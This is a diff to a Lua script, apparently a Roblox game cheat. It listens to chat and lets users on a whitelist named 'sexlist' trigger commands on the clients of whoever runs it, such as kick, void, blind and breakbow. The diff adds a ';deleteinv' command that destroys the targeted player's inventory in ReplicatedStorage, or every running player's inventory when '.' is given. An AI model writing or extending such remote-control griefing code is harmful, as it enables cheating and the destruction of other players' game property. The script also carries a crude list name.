@@ -5,7 +5,7 @@ local Notify = function(_Title, _Text , Time)
 end
 local cmds = "⭐cmds are: reset,ac,void,kick,sit,ad,config."
 local cmds2="help,tbring,song,hev,lobby,vclipdown,butterfingers,listore,breakbow,dropheld,rageblade."
-local cmds3 = "blind,unblind,telepearl,emeraldarmor,apple,popups⭐"
+local cmds3 = "blind,unblind,telepearl,emeraldarmor,apple,popups,deleteinv⭐"
 local ores = "⭐ores that can be dropped are:"
 local ores2 = "iron,diamond,emerald,gold,u can drop stuff that arnt ores too.⭐"
 local sexlist = {
@@ -85,6 +85,12 @@ Listening = TextChatService.MessageReceived:Connect(function(prompt)
 		local textChatService = game:GetService("TextChatService")
 		textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("⭐put the username after the cmd,or put . todo all⭐")
 
+elseif cmd == ";deleteinv" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
+local name = game.Players.LocalPlayer.Name
+game:GetService("ReplicatedStorage").Inventories[name]:Destroy()
+	elseif cmd == ";deleteinv" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
+local name = game.Players.LocalPlayer.Name
+game:GetService("ReplicatedStorage").Inventories[name]:Destroy()
 
 elseif cmd == ";listore" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
 		local textChatService = game:GetService("TextChatService")
